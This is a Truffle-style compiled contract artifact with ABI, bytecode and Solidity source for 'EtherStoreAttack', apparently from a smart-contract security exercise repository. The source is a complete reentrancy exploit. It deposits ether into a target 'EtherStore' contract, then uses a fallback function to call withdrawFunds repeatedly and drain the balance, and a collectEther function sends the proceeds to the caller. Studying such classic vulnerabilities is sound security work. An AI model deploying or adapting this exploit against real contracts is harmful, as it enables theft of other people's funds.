{
  "contractName": "EtherStoreAttack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "name": "setEtherStoreAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attackEtherStore",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610418806100206000396000f3fe60806040526004361061003f5760003560e01c806302fda8791461011d57806379b9b9371461016e578063acd2e6e514610178578063ff11e1db146101cf575b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011b576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561010257600080fd5b505af1158015610116573d6000803e3d6000fd5b505050505b005b34801561012957600080fd5b5061016c6004803603602081101561014057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506101e6565b005b610176610229565b005b34801561018457600080fd5b5061018d61035e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101db57600080fd5b506101e4610383565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b670de0b6b3a764000034101561023e57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102af57600080fd5b505af11580156102c3573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561034457600080fd5b505af1158015610358573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103e0573d6000803e3d6000fd5b5056fea265627a7a723158209a397f8ca6664abf524b7111a518783468ccaf1e1ad0942f9f8df1c27286763564736f6c634300050b0032",
  "source": "pragma solidity 0.5.11;\n\nimport \"contracts/EtherStore.sol\";\n\ncontract EtherStoreAttack {\n  EtherStore public etherStore;\n\n  // intialize the etherStore variable with the contract address\n  function setEtherStoreAddress(address _etherStoreAddress) public {\n      etherStore = EtherStore(_etherStoreAddress);\n  }\n\n  function attackEtherStore() public payable {\n      // attack to the nearest ether\n      require(msg.value >= 1 ether);\n      // send eth to the depositFunds() function\n      etherStore.depositFunds.value(1 ether)();\n      // start the magic\n      etherStore.withdrawFunds(1 ether);\n  }\n\n  function collectEther() public {\n      msg.sender.transfer(address(this).balance);\n  }\n\n  // fallback function - where the magic happens\n  function () external payable {\n      if (address(etherStore).balance >= 1 ether) {\n          etherStore.withdrawFunds(1 ether);\n      }\n  }\n  \n}",
  "sourcePath": "/Users/leanderjehl/repos/blockchain/hacking/security/contracts/EtherStoreAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.11+commit.c082d0b4.Emscripten.clang"
  },
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-10-22T06:44:01.140Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}